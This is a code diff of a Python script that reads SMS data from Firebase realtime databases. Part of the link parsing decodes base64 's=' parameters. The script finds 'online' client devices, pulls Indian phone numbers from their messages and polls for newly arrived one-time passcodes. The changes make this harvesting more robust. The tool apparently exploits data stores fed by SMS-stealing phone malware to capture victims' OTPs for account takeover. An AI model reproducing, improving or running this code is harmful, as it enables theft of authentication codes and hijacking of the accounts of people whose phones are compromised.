@@ -153,32 +153,41 @@ def get_batch_code(user_key, data_key, access_token, batch_code, state, session=
 
 
 # ----------------------------------------------------------------------
-# Firebase Helpers
+# Firebase Helpers (Enhanced & Universal)
 def parse_firebase_link(link):
+    if not link:
+        return None
     link = link.strip()
-    if link.startswith(("http://", "https://")) and (
-        "firebaseio.com" in link or "firebasedatabase.app" in link
-    ):
-        return link.rstrip("/") + "/"
+    if not link.startswith(("http://", "https://")):
+        link = "https://" + link
+
+    # Check if there is an 's=' base64 query param
     parsed = urlparse(link)
     qs = parse_qs(parsed.query)
-    encoded = qs.get("s", [None])[0]
-    if not encoded:
-        return None
-    try:
-        encoded += "=" * (-len(encoded) % 4)
-        decoded = base64.b64decode(encoded).decode("utf-8").split("|")[0].strip()
-        if "firebaseio.com" not in decoded and "firebasedatabase.app" not in decoded:
-            return None
-        return decoded.rstrip("/") + "/"
-    except Exception:
-        return None
+    encoded_s = qs.get("s", [None])[0]
+    if encoded_s:
+        try:
+            encoded_clean = encoded_s + "=" * (-len(encoded_s) % 4)
+            decoded = base64.b64decode(encoded_clean).decode("utf-8", errors="ignore").split("|")[0].strip()
+            if "firebaseio.com" in decoded or "firebasedatabase.app" in decoded:
+                if not decoded.startswith(("http://", "https://")):
+                    decoded = "https://" + decoded
+                return decoded.rstrip("/") + "/"
+        except Exception:
+            pass
+
+    # Direct match for Firebase RTDB domain
+    if "firebaseio.com" in link or "firebasedatabase.app" in link:
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        return base_url.rstrip("/") + "/"
+
+    return None
 
 
 def is_online_device(data):
     if not isinstance(data, dict):
         return False
-    for key in ("status", "state", "online", "isOnline", "connected", "isConnected"):
+    for key in ("status", "state", "online", "isOnline", "connected", "isConnected", "active"):
         value = data.get(key)
         if value is True or value == 1:
             return True
@@ -192,7 +201,7 @@ def is_online_device(data):
 def extract_phone_from_messages(device_messages):
     patterns = [
         (re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"), 10),
-        (re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
+        (re.compile(r"\b(?:phone|mobile|number|num|sender)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
         (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
     ]
     counts = {}
@@ -202,10 +211,15 @@ def extract_phone_from_messages(device_messages):
         msg_iter = device_messages
     else:
         return None
+
     for msg in msg_iter:
-        if not isinstance(msg, dict):
+        if isinstance(msg, str):
+            text = msg
+        elif isinstance(msg, dict):
+            text = str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("address") or msg.get("sender") or "")
+        else:
             continue
-        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
+
         for pattern, score in patterns:
             for number in pattern.findall(text):
                 counts[number] = counts.get(number, 0) + score
@@ -214,74 +228,100 @@ def extract_phone_from_messages(device_messages):
     return max(counts, key=counts.get)
 
 
-def extract_otp_from_messages(device_messages, trigger_time_ms):
+def extract_otp_from_messages(device_messages, trigger_time_ms=None):
     if isinstance(device_messages, dict):
         items = list(device_messages.items())
+        try:
+            items.sort(key=lambda x: int(x[0]), reverse=True)
+        except Exception:
+            pass
     elif isinstance(device_messages, list):
-        items = list(reversed(list(enumerate(device_messages))))
+        items = list(enumerate(reversed(device_messages)))
     else:
         return None
+
     for msg_id, msg_data in items:
-        if not isinstance(msg_data, dict):
+        if isinstance(msg_data, dict):
+            body = str(msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or "")
+        elif isinstance(msg_data, str):
+            body = msg_data
+        else:
             continue
-        try:
-            msg_timestamp = int(msg_id)
-            if msg_timestamp < (trigger_time_ms - 30000):
-                continue
-        except (ValueError, TypeError):
-            pass
-        body = msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or ""
-        match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
-        if match:
-            return match.group(0)
+
+        if not body:
+            continue
+
+        matches = re.findall(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
+        if matches:
+            for m in matches:
+                if m in ("2024", "2025", "2026", "2027"):
+                    continue
+                return m
     return None
 
 
 def fetch_devices_and_phones(firebase_url):
+    clients_data = {}
+    messages_data = {}
+
     try:
-        c_req = requests.get(firebase_url.rstrip("/") + "/clients.json", timeout=30)
-        c_req.raise_for_status()
-        clients_data = c_req.json() or {}
-        m_req = requests.get(firebase_url.rstrip("/") + "/messages.json", timeout=30)
-        m_req.raise_for_status()
-        messages_data = m_req.json() or {}
+        m_req = requests.get(firebase_url.rstrip("/") + "/messages.json", timeout=15)
+        if m_req.status_code == 200:
+            messages_data = m_req.json() or {}
     except Exception as e:
-        print("  [WARN] Failed to fetch Firebase data: " + str(e))
-        return []
-    if not isinstance(clients_data, dict):
-        return []
-    online_devices = []
-    for c_id, c_data in clients_data.items():
-        if is_online_device(c_data):
-            online_devices.append(c_id)
+        print(f"  [WARN] Error fetching messages.json: {e}")
+
+    try:
+        c_req = requests.get(firebase_url.rstrip("/") + "/clients.json", timeout=15)
+        if c_req.status_code == 200:
+            clients_data = c_req.json() or {}
+    except Exception as e:
+        print(f"  [WARN] Error fetching clients.json: {e}")
+
+    seen_phones = set()
     result = []
-    seen = set()
-    for c_id in online_devices:
-        if isinstance(messages_data, dict):
-            device_messages = messages_data.get(str(c_id), {})
-        else:
-            device_messages = {}
-        phone = extract_phone_from_messages(device_messages)
-        if phone and phone not in seen:
-            seen.add(phone)
-            result.append({"client_id": c_id, "phone": phone})
+
+    # Strategy 1: Check clients_data if available
+    if isinstance(clients_data, dict) and clients_data:
+        for c_id, c_data in clients_data.items():
+            if is_online_device(c_data):
+                device_msgs = messages_data.get(str(c_id), {}) if isinstance(messages_data, dict) else {}
+                phone = extract_phone_from_messages(device_msgs)
+                if phone and phone not in seen_phones:
+                    seen_phones.add(phone)
+                    result.append({"client_id": str(c_id), "phone": phone})
+
+    # Strategy 2: If no online devices found via clients.json, search all client keys in messages_data
+    if not result and isinstance(messages_data, dict) and messages_data:
+        for c_id, device_msgs in messages_data.items():
+            phone = extract_phone_from_messages(device_msgs)
+            if phone and phone not in seen_phones:
+                seen_phones.add(phone)
+                result.append({"client_id": str(c_id), "phone": phone})
+
     return result
 
 
-def poll_for_otp(firebase_url, client_id, trigger_time_ms, attempts=10, interval=3):
+def poll_for_otp(firebase_url, client_id, trigger_time_ms, attempts=12, interval=2.5):
     for attempt in range(attempts):
         time.sleep(interval)
         try:
             m_req = requests.get(
-                firebase_url + "messages/" + client_id + ".json", timeout=15
+                firebase_url.rstrip("/") + f"/messages/{client_id}.json", timeout=10
             )
-            messages = m_req.json()
-            if not isinstance(messages, dict) and not isinstance(messages, list):
-                continue
-            otp = extract_otp_from_messages(messages, trigger_time_ms)
-            if otp:
-                return otp
-        except Exception:
+            messages = m_req.json() if m_req.status_code == 200 else None
+            if not messages:
+                m_req = requests.get(firebase_url.rstrip("/") + "/messages.json", timeout=10)
+                all_msgs = m_req.json() if m_req.status_code == 200 else {}
+                if isinstance(all_msgs, dict):
+                    messages = all_msgs.get(str(client_id))
+
+            if messages:
+                otp = extract_otp_from_messages(messages, trigger_time_ms)
+                if otp:
+                    return otp
+        except Exception as e:
+            print(f"  [DEBUG] OTP poll attempt {attempt+1} error: {e}")
             continue
     return None
 
